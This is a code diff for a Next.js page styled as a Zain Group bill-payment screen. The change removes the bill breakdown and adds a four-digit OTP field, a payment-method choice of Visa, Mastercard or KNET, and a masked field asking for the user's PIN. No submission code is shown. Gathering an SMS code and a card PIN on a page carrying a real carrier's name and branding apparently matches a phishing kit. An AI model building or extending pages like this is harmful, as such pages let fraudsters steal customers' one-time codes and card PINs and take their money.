@@ -1,6 +1,6 @@
 "use client"
 
-import { useState } from "react"
+import { useState, useRef } from "react"
 import { useSearchParams } from "next/navigation"
 import Image from "next/image"
 import Link from "next/link"
@@ -9,8 +9,21 @@ import { Suspense } from "react"
 function BillContent() {
   const searchParams = useSearchParams()
   const phone = searchParams.get("phone") || "XXXXXXXX"
+  
+  // OTP State
+  const [otp, setOtp] = useState(["", "", "", ""])
+  const otpRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)]
+  
+  // Amount State
   const [selectedAmount, setSelectedAmount] = useState<"full" | "custom" | "minimum">("full")
   const [customAmount, setCustomAmount] = useState("")
+  
+  // Payment Method State
+  const [selectedPayment, setSelectedPayment] = useState<"visa" | "mastercard" | "knet">("knet")
+  
+  // Verification Code State
+  const [verificationCode, setVerificationCode] = useState(["", "", "", ""])
+  const verificationRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)]
   
   const fullAmount = 12.500
   const minimumAmount = 5.000
@@ -23,6 +36,38 @@ function BillContent() {
         return minimumAmount.toFixed(3)
       case "custom":
         return customAmount || "0.000"
+    }
+  }
+
+  const handleOtpChange = (index: number, value: string) => {
+    if (value.length > 1) return
+    const newOtp = [...otp]
+    newOtp[index] = value
+    setOtp(newOtp)
+    if (value && index < 3) {
+      otpRefs[index + 1].current?.focus()
+    }
+  }
+
+  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
+    if (e.key === "Backspace" && !otp[index] && index > 0) {
+      otpRefs[index - 1].current?.focus()
+    }
+  }
+
+  const handleVerificationChange = (index: number, value: string) => {
+    if (value.length > 1) return
+    const newCode = [...verificationCode]
+    newCode[index] = value
+    setVerificationCode(newCode)
+    if (value && index < 3) {
+      verificationRefs[index + 1].current?.focus()
+    }
+  }
+
+  const handleVerificationKeyDown = (index: number, e: React.KeyboardEvent) => {
+    if (e.key === "Backspace" && !verificationCode[index] && index > 0) {
+      verificationRefs[index - 1].current?.focus()
     }
   }
 
@@ -50,56 +95,42 @@ function BillContent() {
       </header>
 
       {/* Main Content */}
-      <main className="flex-1 flex flex-col items-center px-4 pt-8">
+      <main className="flex-1 flex flex-col items-center px-4 pt-4 pb-8 overflow-y-auto">
         <div className="w-full max-w-sm">
-          {/* Bill Icon */}
-          <div className="flex justify-center mb-8">
-            <div className="w-28 h-28 rounded-full bg-gradient-to-br from-[#6B2D83] via-[#8B4CA0] to-[#D4A574] p-[3px]">
-              <div className="w-full h-full rounded-full bg-[#0d0d1a] flex items-center justify-center">
-                <svg className="w-14 h-14 text-white" fill="none" stroke="currentColor" strokeWidth={1.2} viewBox="0 0 24 24">
-                  <path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
-                </svg>
-              </div>
-            </div>
+          
+          {/* Phone Number Display */}
+          <div className="text-center mb-6">
+            <p className="text-gray-400 text-sm">Mobile Number</p>
+            <p className="text-white text-xl font-bold">+965 {phone}</p>
           </div>
 
-          {/* Title */}
-          <h1 className="text-white text-2xl font-bold text-center mb-2">
-            Bill Details
-          </h1>
-          <p className="text-gray-400 text-center mb-8 text-sm">
-            Mobile Number: +965 {phone}
-          </p>
-
-          {/* Bill Card */}
-          <div className="bg-[#1a1a2e] rounded-2xl p-6 border border-[#2a2a4a] mb-6">
-            <div className="flex justify-between items-center mb-4">
-              <span className="text-gray-400 text-sm">Current Bill</span>
-              <span className="text-[#8B4CA0] text-sm">Due: 15 Jan 2024</span>
+          {/* 1. OTP Code - 4 Digits */}
+          <div className="mb-8">
+            <p className="text-white text-center mb-2 font-semibold">Enter OTP Code</p>
+            <p className="text-gray-400 text-center text-sm mb-4">We sent a code to your mobile</p>
+            <div className="flex justify-center gap-3" dir="ltr">
+              {otp.map((digit, index) => (
+                <input
+                  key={index}
+                  ref={otpRefs[index]}
+                  type="text"
+                  inputMode="numeric"
+                  maxLength={1}
+                  value={digit}
+                  onChange={(e) => handleOtpChange(index, e.target.value.replace(/[^0-9]/g, ""))}
+                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
+                  className="w-14 h-14 bg-[#1a1a2e] border border-[#2a2a4a] rounded-xl text-white text-2xl text-center focus:outline-none focus:ring-2 focus:ring-[#6B2D83] focus:border-transparent"
+                />
+              ))}
             </div>
-            <div className="text-center mb-4">
-              <span className="text-white text-4xl font-bold">12.500</span>
-              <span className="text-gray-400 text-lg ml-2">KWD</span>
-            </div>
-            <div className="border-t border-[#2a2a4a] pt-4">
-              <div className="flex justify-between text-sm mb-2">
-                <span className="text-gray-400">Plan Charges</span>
-                <span className="text-white">10.000 KWD</span>
-              </div>
-              <div className="flex justify-between text-sm mb-2">
-                <span className="text-gray-400">Extra Usage</span>
-                <span className="text-white">2.500 KWD</span>
-              </div>
-              <div className="flex justify-between text-sm">
-                <span className="text-gray-400">VAT (0%)</span>
-                <span className="text-white">0.000 KWD</span>
-              </div>
-            </div>
+            <button className="w-full text-[#8B4CA0] text-sm mt-4 hover:underline">
+              Resend Code
+            </button>
           </div>
 
-          {/* Amount Selection */}
-          <div className="mb-6">
-            <p className="text-gray-400 text-sm mb-4">Select Amount</p>
+          {/* 2. Amount Selection */}
+          <div className="mb-8">
+            <p className="text-white text-center mb-4 font-semibold">Select Amount</p>
             
             {/* Full Amount */}
             <button
@@ -126,23 +157,21 @@ function BillContent() {
             {/* Custom Amount */}
             <button
               onClick={() => setSelectedAmount("custom")}
-              className={`w-full p-4 rounded-xl mb-3 border transition-all ${
+              className={`w-full p-4 rounded-xl mb-3 border transition-all text-left ${
                 selectedAmount === "custom" 
                   ? "bg-[#6B2D83]/20 border-[#6B2D83]" 
                   : "bg-[#1a1a2e] border-[#2a2a4a]"
               }`}
             >
-              <div className="flex items-center justify-between mb-3">
-                <div className="flex items-center gap-3">
-                  <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
-                    selectedAmount === "custom" ? "border-[#8B4CA0]" : "border-gray-500"
-                  }`}>
-                    {selectedAmount === "custom" && (
-                      <div className="w-2.5 h-2.5 rounded-full bg-[#8B4CA0]" />
-                    )}
-                  </div>
-                  <span className="text-white">Custom Amount</span>
+              <div className="flex items-center gap-3 mb-2">
+                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
+                  selectedAmount === "custom" ? "border-[#8B4CA0]" : "border-gray-500"
+                }`}>
+                  {selectedAmount === "custom" && (
+                    <div className="w-2.5 h-2.5 rounded-full bg-[#8B4CA0]" />
+                  )}
                 </div>
+                <span className="text-white">Custom Amount</span>
               </div>
               {selectedAmount === "custom" && (
                 <input
@@ -150,7 +179,7 @@ function BillContent() {
                   value={customAmount}
                   onChange={(e) => setCustomAmount(e.target.value)}
                   placeholder="Enter amount"
-                  className="w-full bg-[#0d0d1a] text-white rounded-lg px-4 py-3 text-left placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[#6B2D83] border border-[#2a2a4a]"
+                  className="w-full bg-[#0d0d1a] text-white rounded-lg px-4 py-3 text-left placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[#6B2D83] border border-[#2a2a4a] mt-2"
                   onClick={(e) => e.stopPropagation()}
                 />
               )}
@@ -177,54 +206,99 @@ function BillContent() {
               </div>
               <span className="text-white font-bold">{minimumAmount.toFixed(3)} KWD</span>
             </button>
+
+            {/* Amount to Pay */}
+            <div className="bg-[#1a1a2e] rounded-xl p-4 border border-[#2a2a4a] mt-4">
+              <div className="flex justify-between items-center">
+                <span className="text-gray-400">Amount to Pay</span>
+                <span className="text-white text-xl font-bold">{getPayAmount()} KWD</span>
+              </div>
+            </div>
           </div>
 
-          {/* Selected Amount Display */}
-          <div className="bg-[#1a1a2e] rounded-xl p-4 border border-[#2a2a4a] mb-6">
-            <div className="flex justify-between items-center">
-              <span className="text-gray-400">Amount to Pay</span>
-              <span className="text-white text-xl font-bold">{getPayAmount()} KWD</span>
+          {/* 3. Payment Methods - KNET */}
+          <div className="mb-8">
+            <p className="text-white text-center mb-4 font-semibold">Select Payment Method</p>
+            <div className="flex justify-center gap-3">
+              <button 
+                onClick={() => setSelectedPayment("visa")}
+                className={`rounded-xl px-4 py-3 flex items-center justify-center min-w-[80px] transition-all ${
+                  selectedPayment === "visa" 
+                    ? "bg-white ring-2 ring-[#6B2D83]" 
+                    : "bg-white/90 hover:bg-white"
+                }`}
+              >
+                <Image 
+                  src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" 
+                  alt="Visa" 
+                  width={50} 
+                  height={30}
+                  className="h-6 w-auto"
+                />
+              </button>
+              <button 
+                onClick={() => setSelectedPayment("mastercard")}
+                className={`rounded-xl px-4 py-3 flex items-center justify-center min-w-[80px] transition-all ${
+                  selectedPayment === "mastercard" 
+                    ? "bg-white ring-2 ring-[#6B2D83]" 
+                    : "bg-white/90 hover:bg-white"
+                }`}
+              >
+                <Image 
+                  src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" 
+                  alt="Mastercard" 
+                  width={50} 
+                  height={30}
+                  className="h-6 w-auto"
+                />
+              </button>
+              <button 
+                onClick={() => setSelectedPayment("knet")}
+                className={`rounded-xl px-4 py-3 flex items-center justify-center min-w-[80px] transition-all ${
+                  selectedPayment === "knet" 
+                    ? "bg-[#0066B3] ring-2 ring-[#6B2D83]" 
+                    : "bg-[#0066B3]/90 hover:bg-[#0066B3]"
+                }`}
+              >
+                <span className="text-white font-bold text-base tracking-wide">KNET</span>
+              </button>
+            </div>
+          </div>
+
+          {/* 4. Verification Code */}
+          <div className="mb-8">
+            <p className="text-white text-center mb-2 font-semibold">Verification Code</p>
+            <p className="text-gray-400 text-center text-sm mb-4">Enter your PIN</p>
+            <div className="flex justify-center gap-3" dir="ltr">
+              {verificationCode.map((digit, index) => (
+                <input
+                  key={index}
+                  ref={verificationRefs[index]}
+                  type="password"
+                  inputMode="numeric"
+                  maxLength={1}
+                  value={digit}
+                  onChange={(e) => handleVerificationChange(index, e.target.value.replace(/[^0-9]/g, ""))}
+                  onKeyDown={(e) => handleVerificationKeyDown(index, e)}
+                  className="w-14 h-14 bg-[#1a1a2e] border border-[#2a2a4a] rounded-xl text-white text-2xl text-center focus:outline-none focus:ring-2 focus:ring-[#6B2D83] focus:border-transparent"
+                />
+              ))}
             </div>
           </div>
 
           {/* Pay Button */}
-          <button className="w-full bg-gradient-to-r from-[#6B2D83] to-[#8B4CA0] text-white font-bold py-4 rounded-full text-lg hover:opacity-90 transition-opacity shadow-lg shadow-purple-900/40 mb-4">
-            Pay Now
+          <button className="w-full bg-gradient-to-r from-[#6B2D83] to-[#8B4CA0] text-white font-bold py-4 rounded-full text-lg hover:opacity-90 transition-opacity shadow-lg shadow-purple-900/40">
+            Pay {getPayAmount()} KWD
           </button>
 
-          {/* Payment Methods */}
-          <p className="text-gray-400 text-sm text-center mb-4">Payment Methods</p>
-          <div className="flex justify-center gap-3">
-            <button className="bg-white rounded-xl px-4 py-3 flex items-center justify-center min-w-[80px] hover:opacity-80 transition-opacity">
-              <Image 
-                src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" 
-                alt="Visa" 
-                width={50} 
-                height={30}
-                className="h-6 w-auto"
-              />
-            </button>
-            <button className="bg-white rounded-xl px-4 py-3 flex items-center justify-center min-w-[80px] hover:opacity-80 transition-opacity">
-              <Image 
-                src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" 
-                alt="Mastercard" 
-                width={50} 
-                height={30}
-                className="h-6 w-auto"
-              />
-            </button>
-            <button className="bg-[#0066B3] rounded-xl px-4 py-3 flex items-center justify-center min-w-[80px] hover:opacity-80 transition-opacity">
-              <span className="text-white font-bold text-base tracking-wide">KNET</span>
-            </button>
-          </div>
         </div>
       </main>
 
       {/* Footer */}
-      <footer className="py-8 px-4">
+      <footer className="py-4 px-4">
         <div className="max-w-md mx-auto">
           <p className="text-gray-600 text-xs text-center">
-            Copyright © 2024 Zain Group, all rights reserved
+            Copyright 2024 Zain Group, all rights reserved
           </p>
         </div>
       </footer>
@@ -234,7 +308,7 @@ function BillContent() {
 
 export default function BillPage() {
   return (
-    <Suspense fallback={<div className="min-h-screen bg-[#1a1a2e] flex items-center justify-center"><div className="text-white">Loading...</div></div>}>
+    <Suspense fallback={<div className="min-h-screen bg-[#0d0d1a] flex items-center justify-center"><div className="text-white">Loading...</div></div>}>
       <BillContent />
     </Suspense>
   )
